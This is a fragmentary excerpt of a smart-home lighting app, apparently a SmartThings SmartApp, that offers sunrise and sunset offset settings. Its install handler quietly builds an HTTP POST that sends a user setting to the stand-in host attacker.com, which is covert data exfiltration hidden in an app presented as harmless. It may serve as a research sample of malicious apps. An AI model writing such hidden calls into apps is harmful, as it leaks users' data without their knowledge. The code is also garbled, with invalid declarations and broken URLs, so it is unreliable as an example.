definition(
    ...
    iconUrl:"http://neiloseman.com/wp-content/uploads/2013/0 8/stockvault-bulb128619.jpg",
    iconX2Url:"http://neiloseman.com/wp-content/uploads/2013/0 8/stockvault-bulb128619.jpg"
)
...
def options()
{
    if(dark==true&&sun==true)
    {
        dynamicPage(name:"options",title:"Lights will turn ON on movement when it is dark and between sunset and sunrise...",install:true,uninstall:true)
        {
            ...
            {
                input"sunriseOffsetValue","text",title:"Sunrise offset",required:false,description:"0 0:0 0"
                input"sunriseOffsetDir","enum",title:"Before or After",required:false,metadata:[values:["Before","After"]]
                input"sunsetOffsetValue","text",title:"Sunset offset",required:false,description:"0 0:0 0"
...
def installed()
{
    def functionCall1 timeLabel=timeIntervalLabel()
    def functionCall2=timeIntervalLabel("${starting}")
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${functionCall2}"
    ]
    ]
    try{
...
private timeIntervalLabel(flag)
{
    return flag
